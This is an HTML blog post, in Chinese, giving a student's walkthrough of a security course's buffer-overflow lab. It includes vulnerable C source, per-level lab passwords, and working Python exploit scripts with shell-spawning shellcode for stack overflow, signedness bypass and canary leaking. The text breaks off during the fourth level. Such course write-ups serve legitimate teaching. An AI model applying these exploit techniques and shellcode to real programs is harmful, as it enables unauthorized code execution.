@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CS161 Project1 writeupSet up在 cs161 的官方下载 VM image，我下载的是pwnable-su21.ova。 在 VirtualBox 中无界面启动，采用默认的网络设置，然后在 shell 中执行ssh -p 16121 customizer@127.0.0.1，输入密码 customizer，按照提示进行相关配置。此后每一道题按照此程序并使用相应的用户名以及">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CS161 Project1 Writeup">
+<meta property="og:url" content="http://example.com/2024/07/09/CS161%20Project1%20Writeup/index.html">
+<meta property="og:site_name" content="molepi&#39;s home">
+<meta property="og:description" content="CS161 Project1 writeupSet up在 cs161 的官方下载 VM image，我下载的是pwnable-su21.ova。 在 VirtualBox 中无界面启动，采用默认的网络设置，然后在 shell 中执行ssh -p 16121 customizer@127.0.0.1，输入密码 customizer，按照提示进行相关配置。此后每一道题按照此程序并使用相应的用户名以及">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-07-09T13:47:28.045Z">
+<meta property="article:modified_time" content="2024-07-09T13:52:50.257Z">
+<meta property="article:author" content="molepi">
+<meta property="article:tag" content="report">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CS161 Project1 Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/08/hello-world/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/09/CS161%20Project1%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&text=CS161 Project1 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&is_video=false&description=CS161 Project1 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CS161 Project1 Writeup&body=Check out this article: http://example.com/2024/07/09/CS161%20Project1%20Writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&name=CS161 Project1 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&t=CS161 Project1 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CS161-Project1-writeup"><span class="toc-number">1.</span> <span class="toc-text">CS161 Project1 writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Set-up"><span class="toc-number">1.1.</span> <span class="toc-text">Set up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-1-Remus"><span class="toc-number">1.2.</span> <span class="toc-text">Question 1 Remus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-2-Spica"><span class="toc-number">1.3.</span> <span class="toc-text">Question 2 Spica</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-3-Polaris"><span class="toc-number">1.4.</span> <span class="toc-text">Question 3 Polaris</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-4-Vega"><span class="toc-number">1.5.</span> <span class="toc-text">Question 4 Vega</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-5-Deneb"><span class="toc-number">1.6.</span> <span class="toc-text">Question 5 Deneb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-6-Rigel"><span class="toc-number">1.7.</span> <span class="toc-text">Question 6 Rigel</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CS161 Project1 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">molepi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-09T13:47:28.045Z" class="dt-published" itemprop="datePublished">2024-07-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/cs161/">cs161</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/report/" rel="tag">report</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="CS161-Project1-writeup"><a href="#CS161-Project1-writeup" class="headerlink" title="CS161 Project1 writeup"></a>CS161 Project1 writeup</h1><h2 id="Set-up"><a href="#Set-up" class="headerlink" title="Set up"></a>Set up</h2><p>在 cs161 的官方下载 VM image，我下载的是<a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1OJeNLKrj2tm-1-gonb2Dfp6foQIryCx_">pwnable-su21.ova</a>。</p>
+<p>在 VirtualBox 中无界面启动，采用默认的网络设置，然后在 shell 中执行<br><code>ssh -p 16121 customizer@127.0.0.1</code>，输入密码 customizer，按照提示进行相关配置。此后每一道题按照此程序并使用相应的用户名以及密码。</p>
+<h2 id="Question-1-Remus"><a href="#Question-1-Remus" class="headerlink" title="Question 1 Remus"></a>Question 1 Remus</h2><p>user: remus<br>password: ilearned</p>
+<p>查看<code>orbit.c</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">orbit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">  gets(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  orbit();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个很简单但也很标准的 memory overflow。执行<code>./debug-exploit</code>查看相关的 memory 信息，得到</p>
+<ol>
+<li><code>buf</code> at <code>0xbffffa88</code></li>
+<li><code>sfp</code> at <code>0xbffffa98</code></li>
+<li><code>rip</code> at <code>0xbffffa9c</code></li>
+</ol>
+<p>按照常规的攻击思路，让<code>rip</code>指向 shellcode，<code>buf</code>到<code>rip</code>这块内存就用 garbage 填充，然后将 shellcode 放在<code>rip</code>上方，其地址则为<code>buf</code>+ 4 &#x3D; <code>0xbffffaa0</code>。egg 脚本如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line">garbage = <span class="string">&#x27;A&#x27;</span> * <span class="number">20</span></span><br><span class="line">rip = <span class="string">&quot;\xa0\xfa\xff\xbf&quot;</span></span><br><span class="line">shellcode = \</span><br><span class="line">    <span class="string">&quot;\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = garbage + rip + shellcode</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>./exploit</code>，shellcode 使 dumb-shell 运行，再执行<code>cat README</code>即可获得 next username &amp; next password。</p>
+<h2 id="Question-2-Spica"><a href="#Question-2-Spica" class="headerlink" title="Question 2 Spica"></a>Question 2 Spica</h2><p>username: spica<br>password: alanguage</p>
+<p>先看<code>telemetry.c</code>中的内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">display</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> msg[<span class="number">128</span>];</span><br><span class="line">  <span class="type">int8_t</span> size;</span><br><span class="line">  <span class="built_in">memset</span>(msg, <span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">  FILE *file = fopen(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">    perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">size_t</span> n = fread(&amp;size, <span class="number">1</span>, <span class="number">1</span>, file);</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">0</span> || size &gt; <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  n = fread(msg, <span class="number">1</span>, size, file);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  display(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个程序是从文件中读取数据，文件的第一个 byte 是需要读取的 byte 数。注意到<code>size</code>的类型是<code>int8_t</code>，其范围为[-128, 127]，但是<code>fread</code>的 signature 为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> * buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE * stream)</span></span><br></pre></td></tr></table></figure>
+
+<p><code>size_t</code>是无符号整数型，在此 32 位系统中被定义为 unsigned int。如果让<code>size</code>为-1，其表示为<code>size_t</code>则为 255，则可以绕过对<code>size</code>的检查读入更多的文件数据，导致 buffer overflow。</p>
+<p>有了攻击思路后再执行<code>./debug-exploit</code>，得到</p>
+<ol>
+<li><code>msg</code> at <code>0xbffff9e8</code></li>
+<li><code>sfp</code> at <code>0xbffffa78</code></li>
+<li><code>rip</code> at <code>0xbffffa7c</code></li>
+</ol>
+<p>和 question 1 类似的方法，编写 egg 脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line">size = <span class="string">&quot;\xff&quot;</span></span><br><span class="line">garbage = <span class="string">&#x27;A&#x27;</span> * <span class="number">148</span></span><br><span class="line">rip = <span class="string">&quot;\x80\xfa\xff\xbf&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = \</span><br><span class="line">    <span class="string">&quot;\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = size + garbage + rip + shellcode</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>./exploit</code>，读取 README。</p>
+<h2 id="Question-3-Polaris"><a href="#Question-3-Polaris" class="headerlink" title="Question 3 Polaris"></a>Question 3 Polaris</h2><p>username: polaris<br>password: tolearn</p>
+<p>查看<code>dehexify.c</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFLEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">nibble_to_int</span><span class="params">(<span class="type">char</span> nibble)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;0&#x27;</span> &lt;= nibble &amp;&amp; nibble &lt;= <span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> nibble - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> nibble - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dehexify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> answer[BUFLEN];</span><br><span class="line">        <span class="type">char</span> buffer[BUFLEN];</span><br><span class="line">    &#125; c;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    gets(c.buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (c.buffer[i]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c.buffer[i] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; c.buffer[i+<span class="number">1</span>] == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">int</span> top_half = nibble_to_int(c.buffer[i+<span class="number">2</span>]);</span><br><span class="line">            <span class="type">int</span> bottom_half = nibble_to_int(c.buffer[i+<span class="number">3</span>]);</span><br><span class="line">            c.answer[j] = top_half &lt;&lt; <span class="number">4</span> | bottom_half;</span><br><span class="line">            i += <span class="number">3</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            c.answer[j] = c.buffer[i];</span><br><span class="line">        &#125;</span><br><span class="line">        i++; j++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c.answer[j] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, c.answer);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="built_in">stdin</span>)) &#123;</span><br><span class="line">        dehexify();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个将\x 前缀的十六进制 byte 转换成十进制 byte 的程序。<br>注意在这一题中前两题的方法不能直接起作用，因为此题中的程序开启了 canary，如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x400716 &lt;dehexify+18&gt;  mov    %gs:0x14,%eax</span><br><span class="line">0x40071c &lt;dehexify+24&gt;  mov    %eax,-0x8(%ebp)</span><br></pre></td></tr></table></figure>
+
+<p>并且在离开函数前才会检查 canary，在函数内 exploit 时重写 canary，只要值没变，就能通过检查。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x40080d &lt;dehexify+265&gt; mov    -0x8(%ebp),%eax</span><br><span class="line">0x400810 &lt;dehexify+268&gt; xor    %gs:0x14,%eax</span><br><span class="line">0x400817 &lt;dehexify+275&gt; je     0x40081e &lt;dehexify+282&gt;</span><br><span class="line">0x400819 &lt;dehexify+277&gt; call   0x400858 &lt;__stack_chk_fail_local&gt;</span><br><span class="line">0x40081e &lt;dehexify+282&gt; mov    -0x4(%ebp),%ebx</span><br><span class="line">0x400821 &lt;dehexify+285&gt; leave</span><br><span class="line">0x400822 &lt;dehexify+286&gt; ret</span><br></pre></td></tr></table></figure>
+
+<p>那么如何获取 canary 的值呢，我们注意到在 while 循环中对十六进制表示进行转换时，<code>i</code>, <code>i+1</code>, <code>i+2</code>, <code>i+3</code>会被使用。可以利用<code>i</code>跳过对<code>c.buffer</code>的最后一个 byte 的检查。即让<code>c.buffer</code>中的值为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27; * 12 + &#x27;\\x&#x27; + &#x27;\0&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>当<code>i == 12</code>时，<code>i+4 == 16</code>跳过了<code>i == 15</code>的情况，while 循环会继续读后面的 memory，以此我们可以得到 canary 的值。</p>
+<p>然后执行<code>./debug-exploit</code>，得到</p>
+<ol>
+<li><code>c.buffer</code> at <code>0xbffffa84</code></li>
+<li><code>sfp</code> at <code>0xbffffa9c</code></li>
+<li><code>rip</code> at <code>0xbffffaa0</code></li>
+<li>canary at <code>0xbffffa9c - 0x8 = 0xbffffa94</code></li>
+</ol>
+<p>按照之前的思路设置<code>rip</code>和 shellcode，但是这次我们要将得到的 canary 值置于 canary 所在的地址。现在我们来编写 interact 交互脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scffold <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">first_buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">12</span> + <span class="string">&#x27;\\x\n&#x27;</span></span><br><span class="line">p.send(first_buffer)</span><br><span class="line"></span><br><span class="line">canary = p.recv(<span class="number">13</span> + <span class="number">4</span>)[<span class="number">13</span>:<span class="number">17</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary: &quot;</span> + <span class="string">&quot; &quot;</span>.join(<span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> canary))</span><br><span class="line"></span><br><span class="line">rip = <span class="string">&quot;\xa4\xfa\xff\xbf&quot;</span></span><br><span class="line">garbage1 = <span class="string">&#x27;\0&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">15</span></span><br><span class="line">garbage2 = <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload = garbage1 + canary + garbage2 + rip + shellcode + <span class="string">&quot;\n&quot;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p><code>first_buffer</code>是第一次尝试获取 canary 的交互，使用<code>\x</code>跳过对<code>c.buffer[15] == &#39;\0&#39;</code>的检查。由 canary 和<code>c.buffer</code>的地址可知二者正好相差 16，即<code>c.buffer</code>的上方就是 canary，因此<code>first_buffer + &#39;\0&#39;</code>转换后有 13bytes，则第 14 到第 17 个 byte 就是 canary 的值，从<code>p</code>接受到的 bytes 中直接提取。接下来构造第二次交互的 payload，首先将第一个 byte 设置为<code>&#39;\0&#39;</code>，让<code>printf</code>范围不会超过<code>c.answer</code>。然后用 garbage 填满<code>c.buffer</code>，之后写入 canary 的值，用 garbage2 填满 canary 后到<code>rip</code>的区域，<code>rip</code>写入 shellcode 的地址（<code>rip</code>上方），然后写入 shellcode。</p>
+<p>执行<code>./exploit</code>即可完成。</p>
+<h2 id="Question-4-Vega"><a href="#Question-4-Vega" class="headerlink" title="Question 4 Vega"></a>Question 4 Vega</h2><p>username: vega<br>password: whyishould</p>
+<p>查看<code>flipper.c</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">flip</span><span class="params">(<span class="type">char</span> *buf, <span class="type">const</span> <span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> n = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n &amp;&amp; i &lt;= <span class="number">64</span>; ++i)</span><br><span class="line">    buf[i] = input[i] ^ (<span class="number">1u</span> &lt;&lt; <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i &lt; <span class="number">64</span>)</span><br><span class="line">    buf[i++] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">invoke</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *in)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">  flip(buf, in);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dispatch</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *in)</span></span><br><span class="line">&#123;</span><br><span class="line">  invoke(in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  dispatch(argv[<span class="number">1</span>]);</span><br><span 